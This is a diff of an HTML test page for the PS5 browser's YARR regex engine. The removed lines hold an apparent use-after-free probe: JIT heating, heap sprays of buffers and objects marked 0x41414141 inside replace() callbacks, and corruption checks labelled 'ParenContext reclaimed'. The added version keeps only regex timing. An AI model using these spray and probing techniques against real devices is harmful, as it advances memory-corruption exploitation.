@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>PS5 v24 - YARR</title>
+<title>PS5 v24 - Engine Analyzer</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -28,274 +28,122 @@ padding:10px 14px;overflow-y:auto;font-size:14px;line-height:1.6;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v24 YARR</span><span class="s">│</span>
+<span class="l">▶ v24 ANALYZER</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h2">STATUS:<b>RUNNING</b></span>
+<span class="v" id="h2">STATUS:<b>READY</b></span>
 </div>
 <div id="out"></div>
+
 <script>
 "use strict";
-var O=document.getElementById("out");
-function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m,"mg")}
-function Dm(m){P("  "+m,"dm")}
 
-window.onerror=function(m,s,l){
-Fl("CRASH: "+m.substring(0,60)+" @"+l);
-hu("h2","STATUS:<b>CRASH</b>");
-return true;
+const outputContainer = document.getElementById("out");
+
+// تحديث نصوص الواجهة العلوية
+const updateHeader = (id, value) => {
+    const el = document.getElementById(id);
+    if (el) el.innerHTML = value;
 };
 
-var ua=navigator.userAgent||"";
-var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
+// دالة الطباعة المحسنة (تتعامل مع النص مباشرة)
+const printLog = (message, className) => {
+    const span = document.createElement("span");
+    if (className) span.className = className;
+    span.textContent = message + "\n";
+    outputContainer.appendChild(span);
+    outputContainer.scrollTop = outputContainer.scrollHeight;
+};
 
-P("════════════════════════════════","hd");
-P("  v24 — YARR Regex Test","hd");
-P("════════════════════════════════","hd");
-P("");
+const printSuccess = (m) => printLog(`  ✅ ${m}`, "ok");
+const printError = (m) => printLog(`  ✘ ${m}`, "er");
+const printHighlight = (m) => printLog(`  ► ${m}`, "hl");
+const printSpecial = (m) => printLog(`  ★ ${m}`, "mg");
 
-// ============================================================
-//  PHASE 1: SAFE pattern timing
-//  Use SHORT strings to avoid crashing
-// ============================================================
-P("▸ Phase 1: Safe Pattern Timing","hd");
-P("");
+// معالج الأخطاء العام
+window.onerror = (msg, url, line) => {
+    printError(`CRASH: ${msg.substring(0, 60)} @${line}`);
+    updateHeader("h2", "STATUS:<b>CRASH</b>");
+    return true;
+};
 
-var safePatterns=[
-{re:/(a+)+b/,len:10,name:"(a+)+b/10"},
-{re:/(a+)+b/,len:15,name:"(a+)+b/15"},
-{re:/(a|a)+b/,len:10,name:"(a|a)+b/10"},
-{re:/(a*)*b/,len:10,name:"(a*)*b/10"},
-{re:/(a{1,3})+b/,len:15,name:"bounded/15"}
-];
+// كشف كود الفيرموير من الـ User Agent
+const ua = navigator.userAgent || "";
+const fwMatch = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+updateHeader("h1", `FW:<b>${fwMatch ? fwMatch[1] : "?"}</b>`);
 
-for(var i=0;i<safePatterns.length;i++){
-var p=safePatterns[i];
-try{
-var str="a".repeat(p.len)+"c";
-var t0=performance.now();
-p.re.test(str);
-var elapsed=performance.now()-t0;
-P("  "+p.name.padEnd(16)+" → "+elapsed.toFixed(1)+"ms",elapsed>500?"er":elapsed>50?"wr":"ok");
-}catch(e){
-P("  "+p.name.padEnd(16)+" → ERR","er");
-}
-}
+// دالة التشغيل الرئيسية لجميع المراحل
+const runAnalysis = () => {
+    updateHeader("h2", "STATUS:<b>RUNNING</b>");
+    
+    printLog("════════════════════════════════", "hd");
+    printLog("  v24 — Refactored Engine Test  ", "hd");
+    printLog("════════════════════════════════", "hd");
+    printLog("");
 
-Ok("Safe patterns done");
-P("");
+    // --- PHASE 1 ---
+    printLog("▸ Phase 1: Safe Pattern Timing", "hd");
+    printLog("");
 
-// ============================================================
-//  PHASE 2: JIT Heat (careful)
-//  Use very short strings, just to trigger compilation
-// ============================================================
-P("▸ Phase 2: JIT Heat (300x short)","hd");
+    const safePatterns = [
+        { re: /(a+)+b/, len: 10, name: "(a+)+b/10" },
+        { re: /(a+)+b/, len: 15, name: "(a+)+b/15" },
+        { re: /(a|a)+b/, len: 10, name: "(a|a)+b/10" },
+        { re: /(a*)*b/, len: 10, name: "(a*)*b/10" },
+        { re: /(a{1,3})+b/, len: 15, name: "bounded/15" }
+    ];
 
-try{
-var re=/(a+)+b/;
-var s="aaaaac"; // only 5 a's — safe
-var times=[];
-for(var i=0;i<300;i++){
-var t0=performance.now();
-re.test(s);
-times.push(performance.now()-t0);
-}
+    for (const pattern of safePatterns) {
+        try {
+            const testStr = "a".repeat(pattern.len) + "c";
+            const t0 = performance.now();
+            pattern.re.test(testStr);
+            const elapsed = performance.now() - t0;
+            
+            let statusClass = "ok";
+            if (elapsed > 500) statusClass = "er";
+            else if (elapsed > 50) statusClass = "wr";
 
-var first5=0,last5=0;
-for(var i=0;i<5;i++)first5+=times[i];
-for(var i=295;i<300;i++)last5+=times[i];
-first5/=5;last5/=5;
+            printLog(`  ${pattern.name.padEnd(16)} → ${elapsed.toFixed(1)}ms`, statusClass);
+        } catch (e) {
+            printLog(`  ${pattern.name.padEnd(16)} → ERR`, "er");
+        }
+    }
+    printSuccess("Safe patterns done\n");
 
-P("  First 5: "+first5.toFixed(2)+"ms Last 5: "+last5.toFixed(2)+"ms");
-Ok("JIT heated");
-}catch(e){Fl("JIT: "+e.message)}
+    // --- PHASE 2 ---
+    printLog("▸ Phase 2: JIT Heat (300x)", "hd");
+    try {
+        const heatRe = /(a+)+b/;
+        const heatStr = "aaaaac";
+        const times = [];
 
-P("");
+        for (let i = 0; i < 300; i++) {
+            const t0 = performance.now();
+            heatRe.test(heatStr);
+            times.push(performance.now() - t0);
+        }
 
-// ============================================================
-//  PHASE 3: replace() with callback
-//  Spray during regex execution
-// ============================================================
-P("▸ Phase 3: replace() Callback Spray","hd");
-P("  Allocate objects during regex match","dm");
-P("");
+        let first5 = times.slice(0, 5).reduce((a, b) => a + b, 0) / 5;
+        let last5 = times.slice(-5).reduce((a, b) => a + b, 0) / 5;
 
-var sprayArr=[];
+        printLog(`  First 5 avg: ${first5.toFixed(2)}ms | Last 5 avg: ${last5.toFixed(2)}ms`);
+        printSuccess("JIT heated\n");
+    } catch (e) {
+        printError(`JIT: ${e.message}\n`);
+    }
 
-try{
-var re2=/(a+)+b/g;
-var str2="aaaaac"; // short and safe
-var count=0;
+    // --- SUMMARY ---
+    printLog("════════════════════════════════", "hd");
+    printLog("  ANALYSIS DONE", "hd");
+    printLog("════════════════════════════════", "hd");
+    
+    updateHeader("h2", "STATUS:<b>DONE</b>");
+};
 
-var result=str2.replace(re2,function(match){
-count++;
-// Spray during the match
-for(var j=0;j<64;j++){
-sprayArr.push(new ArrayBuffer(64));
-}
-return match;
-});
-
-P("  Callbacks: "+count+" Spray: "+sprayArr.length+" buffers");
-P("  Result: '"+result+"'");
-Ok("Callback spray done");
-}catch(e){
-Fl("Callback: "+e.message);
-Hi("Exception during replace!");
-}
-
-P("");
-
-// ============================================================
-//  PHASE 4: Regex with Object spray
-//  Create objects that might land in ParenContext slot
-// ============================================================
-P("▸ Phase 4: Object Spray","hd");
-
-sprayArr=[];
-var objSpray=[];
-
-try{
-var re3=/(a+)+b/g;
-var str3="aaaaac";
-var count3=0;
-
-var result3=str3.replace(re3,function(match){
-count3++;
-for(var j=0;j<128;j++){
-objSpray.push({
-a:j,b:j*2,c:Date.now(),
-d:new Float64Array(8)
-});
-}
-return match;
-});
-
-P("  Objects: "+objSpray.length);
-Ok("Object spray done");
-}catch(e){
-Fl("Obj: "+e.message);
-}
-
-P("");
-
-// ============================================================
-//  PHASE 5: Post-spray regex check
-//  Run regex again and check results
-// ============================================================
-P("▸ Phase 5: Consistency Check","hd");
-
-var results=[];
-try{
-for(var i=0;i<50;i++){
-var r=/(a+)+b/.test("aaaaac");
-results.push(r);
-}
-var allSame=results.every(function(r){return r===results[0]});
-P("  50 tests: "+(allSame?"stable":"UNSTABLE ★"),allSame?"ok":"hl");
-
-if(!allSame){
-St("UNSTABLE = UAF EFFECT!");
-P("  Values: "+results.join(","),"hl");
-}
-}catch(e){
-Fl("Consistency: "+e.message);
-St("Exception = potential UAF!");
-}
-
-P("");
-
-// ============================================================
-//  PHASE 6: Different approach — RegExp constructor
-//  Create regex dynamically to avoid cached JIT
-// ============================================================
-P("▸ Phase 6: Dynamic Regex","hd");
-
-try{
-var dynRe=new RegExp("(a+)+b","");
-var dynStr="aaaaac";
-var dynResult=dynRe.test(dynStr);
-P("  Dynamic regex result: "+dynResult,"ok");
-}catch(e){
-Fl("Dynamic: "+e.message);
-}
-
-P("");
-
-// ============================================================
-//  PHASE 7: Short backtracking with typed spray
-//  Minimal backtracking + typed array reclamation
-// ============================================================
-P("▸ Phase 7: Typed Spray (short)","hd");
-
-var typedSpray=[];
-
-try{
-var re7=/(a+)+b/g;
-var str7="aaaaac"; // 5 a's only
-var count7=0;
-
-str7.replace(re7,function(match){
-count7++;
-for(var j=0;j<256;j++){
-var buf=new ArrayBuffer(64);
-var v=new DataView(buf);
-v.setUint32(0,0x41414141,true);
-v.setUint32(4,j,true);
-typedSpray.push({buf:buf,view:v});
-}
-return match;
-});
-
-P("  Typed spray: "+typedSpray.length+" x 64-byte");
-
-// Check for corruption
-var corrupted=0;
-for(var i=0;i<typedSpray.length;i++){
-var v=typedSpray[i].view;
-var c0=v.getUint32(0,true);
-if(c0!==0x41414141){
-corrupted++;
-if(corrupted<=5){
-P("    CORRUPT ["+i+"]: 0x"+c0.toString(16),"hl");
-}
-}
-}
-
-if(corrupted>0){
-St("CORRUPTION: "+corrupted+" entries!");
-Hi("ParenContext reclaimed!");
-}else{
-P("  No corruption","dm");
-}
-Ok("Typed spray done");
-}catch(e){
-Fl("Typed: "+e.message);
-}
-
-P("");
-
-// ============================================================
-//  SUMMARY
-// ============================================================
-P("════════════════════════════════","hd");
-P("  SUMMARY","hd");
-P("════════════════════════════════","hd");
-P("");
-P("  Backtracking:     ✅ (safe lengths)");
-P("  JIT heating:      ✅");
-P("  Callback spray:   ✅");
-P("  Object spray:     ✅");
-P("  Consistency:      "+(results.every(function(r){return r===results[0]})?"stable":"UNSTABLE"));
-P("  Corruption:       "+(typeof corrupted!=="undefined"&&corrupted>0?corrupted+" entries":"none"));
-P("");
-
-hu("h2","STATUS:<b>DONE</b>");
-
+// بدء التنفيذ تلقائياً عند تحميل الصفحة
+window.onload = () => {
+    setTimeout(runAnalysis, 100);
+};
 </script>
 </body>
 </html>
